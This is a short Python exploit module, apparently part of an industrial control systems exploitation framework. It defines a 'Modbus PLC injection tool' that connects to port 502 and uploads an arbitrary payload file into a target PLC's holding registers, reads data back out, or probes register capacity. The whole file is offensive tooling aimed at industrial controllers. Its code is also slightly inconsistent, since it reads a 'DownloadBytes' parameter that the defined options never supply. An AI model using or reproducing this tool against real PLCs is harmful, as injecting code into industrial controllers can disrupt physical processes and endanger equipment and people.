#!/usr/bin/env python
# coding=utf-8

from core.exploit import *
from plcInjectPayload import *


class MyScript(BaseExploit):
    register_info = {
        'ID' : 'ICF-2017-F0010005',
        'Name' : 'Modbus PLC注入工具',
        'Author' : 'w3h',
        'License': ISF_LICENSE,
        'Create_Date' : '2017-04-09',
        'Description' : '''Modbus PLC注入工具。''',
    }

    register_options = [
        mkopt('--Function', metavar='<UploadFun/DownloadFun/SizeFun>', help='upload or download or size'),
        mkopt('--Upload', metavar='<payld.bin>', help='payload to upload to the PLC'),
        mkopt('--Download', metavar='<n bytes>', help='download <n> bytes from the PLC.'),
        mkopt('--Size', metavar='<n bytes>', help='check if the PLC can allocate <n> bytes in its holding registers'),
        mkopt('--StartAddr', metavar='<addr>', help='start address from which to upload/download data (0 if not set)', default=0),
        mkopt_rport(502),
    ]

    def exploit(self, *args, **kwargs):
        fname = self.getParam('Function')
        if fname == 'DownloadFun':
            size = int(self.getParam('DownloadBytes'))
            addr = int(self.getParam('StartAddr'))
            download_data(size, self.TargetIp, addr)
        elif fname == 'UploadFun':
            upload = self.getParam('Upload')
            addr = int(self.getParam('StartAddr'))
            upload_payload(upload, self.TargetIp, addr)
        elif fname == 'SizeFun':
            num = int(self.getParam('Size'))
            size = check_size(num, self.TargetIp)
        else:
            raise

MainEntry(MyScript, __name__)
